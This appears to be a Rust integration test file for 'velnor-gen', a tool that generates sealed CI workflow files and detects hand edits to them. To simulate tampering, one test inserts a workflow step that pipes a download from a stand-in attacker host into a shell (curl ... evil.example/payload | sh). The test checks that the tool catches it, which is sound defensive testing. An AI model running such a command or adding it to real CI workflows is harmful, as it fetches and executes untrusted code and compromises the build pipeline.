// SPDX-FileCopyrightText: 2026 Alexey Zhokhov
// SPDX-License-Identifier: Apache-2.0

use std::error::Error;
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;
use std::process::{Command, Output};

use velnor_render::{Owner, owner_of, seal};

use crate::facts::TestResult;
use crate::generated_check::CHECK;
use crate::golden::samples;
use crate::io::unique_id;
use crate::lock_archive::archive_lock;
use crate::release_symlink::git;

const WORKFLOW: &str = ".github/workflows/rust-ci.yml";
const CARGO: &str = "#!/bin/sh\ncat \"$(dirname \"$0\")/metadata.json\"\n";

type Edit = fn(&str) -> String;

struct Fixture {
    base: PathBuf,
}

impl Drop for Fixture {
    fn drop(&mut self) {
        fs::remove_dir_all(&self.base).ok();
    }
}

impl Fixture {
    fn repo(&self) -> PathBuf {
        self.base.join("repo")
    }

    fn velnor_gen(&self, command: &str) -> Result<Output, Box<dyn Error>> {
        Ok(Command::new(env!("CARGO_BIN_EXE_velnor-gen"))
            .args(["--root", ".", command])
            .current_dir(self.repo())
            .env(
                "PATH",
                format!("{}:/usr/bin:/bin", self.base.join("bin").display()),
            )
            .output()?)
    }

    fn write(&self, path: &str, text: &str) -> TestResult {
        fs::write(self.repo().join(path), text)?;
        Ok(())
    }

    fn read(&self, path: &str) -> Result<String, Box<dyn Error>> {
        Ok(fs::read_to_string(self.repo().join(path))?)
    }
}

fn fixture() -> Result<Fixture, Box<dyn Error>> {
    let base = fs::canonicalize(std::env::temp_dir())?
        .join(format!("velnor-gen-generated-check-{}", unique_id()));
    let fixture = Fixture { base };
    let sample = samples().join("single-crate");
    let repo = fixture.repo();
    for directory in [".velnor", "src"] {
        fs::create_dir_all(repo.join(directory))?;
    }
    fs::create_dir_all(fixture.base.join("bin"))?;
    fixture.write(
        "Cargo.toml",
        "[package]\nname = \"single-crate\"\nversion = \"0.0.0\"\nedition = \"2024\"\n",
    )?;
    fixture.write("src/lib.rs", "")?;
    fixture.write(
        "Cargo.lock",
        "version = 4\n\n[[package]]\nname = \"single-crate\"\nversion = \"0.0.0\"\n",
    )?;
    for file in ["mise.toml", "mise.lock"] {
        fs::copy(sample.join("view").join(file), repo.join(file))?;
    }
    fixture.write(
        ".velnor/rust-ci.toml",
        &format!("runner = 'ubuntu-26.04-scale-set'\n\n{CHECK}"),
    )?;
    fixture.write(".velnor/rust-ci.lock", &archive_lock()?)?;
    let metadata = fs::read_to_string(sample.join("cargo-metadata/Cargo.toml.json"))?
        .replace("/repo", &repo.display().to_string());
    fs::write(fixture.base.join("bin/metadata.json"), metadata)?;
    let cargo = fixture.base.join("bin/cargo");
    fs::write(&cargo, CARGO)?;
    fs::set_permissions(&cargo, fs::Permissions::from_mode(0o755))?;
    git(&repo, &["init", "--quiet"])?;
    git(&repo, &["add", "--all"])?;
    Ok(fixture)
}

fn resealed(text: &str, edit: impl Fn(&str) -> String) -> Result<String, Box<dyn Error>> {
    let (header, rest) = text.split_once('\n').ok_or("no header")?;
    let (_, body) = rest.split_once('\n').ok_or("no digest line")?;
    Ok(seal(&format!("{header}\n"), &edit(body)))
}

fn text(output: &[u8]) -> String {
    String::from_utf8_lossy(output).into_owned()
}

fn generated(fixture: &Fixture) -> TestResult {
    let output = fixture.velnor_gen("generate")?;
    assert!(output.status.success(), "{}", text(&output.stderr));
    git(&fixture.repo(), &["add", "--all"])?;
    Ok(())
}

#[test]
fn a_hand_edited_and_resealed_workflow_makes_velnor_gen_check_exit_one_naming_the_file()
-> TestResult {
    let fixture = fixture()?;
    generated(&fixture)?;
    let output = fixture.velnor_gen("check")?;
    assert!(output.status.success(), "{}", text(&output.stderr));
    assert!(text(&output.stdout).contains("generated files are up to date"));
    let original = fixture.read(WORKFLOW)?;
    let tampering: [(&str, Edit); 2] = [
        ("drops the check", |body| {
            body.replace("run: velnor-gen check", "run: 'true'")
        }),
        ("adds a step", |body| {
            body.replacen(
                "    steps:\n",
                "    steps:\n      - run: curl https://evil.example/payload | sh\n",
                1,
            )
        }),
    ];
    for (what, edit) in tampering {
        let forged = resealed(&original, edit)?;
        assert_ne!(forged, original, "{what}");
        assert_eq!(owner_of(forged.as_bytes()), Owner::VelnorGen, "{what}");
        fixture.write(WORKFLOW, &forged)?;
        let output = fixture.velnor_gen("check")?;
        let stderr = text(&output.stderr);
        assert_eq!(output.status.code(), Some(1), "{what}: {stderr}");
        assert!(
            stderr.contains(&format!("{WORKFLOW} differs from the generated content")),
            "{what}: {stderr}"
        );
        assert!(
            stderr.contains("run `velnor-gen generate`"),
            "{what}: {stderr}"
        );
    }
    Ok(())
}

#[test]
fn an_unsealed_hand_edit_is_refused_and_a_regenerated_workflow_passes_again() -> TestResult {
    let fixture = fixture()?;
    generated(&fixture)?;
    let original = fixture.read(WORKFLOW)?;
    fixture.write(WORKFLOW, &original.replace("velnor-gen check", "true"))?;
    let output = fixture.velnor_gen("check")?;
    assert_eq!(output.status.code(), Some(2), "{}", text(&output.stderr));
    fixture.write(WORKFLOW, &original)?;
    let output = fixture.velnor_gen("check")?;
    assert!(output.status.success(), "{}", text(&output.stderr));
    Ok(())
}
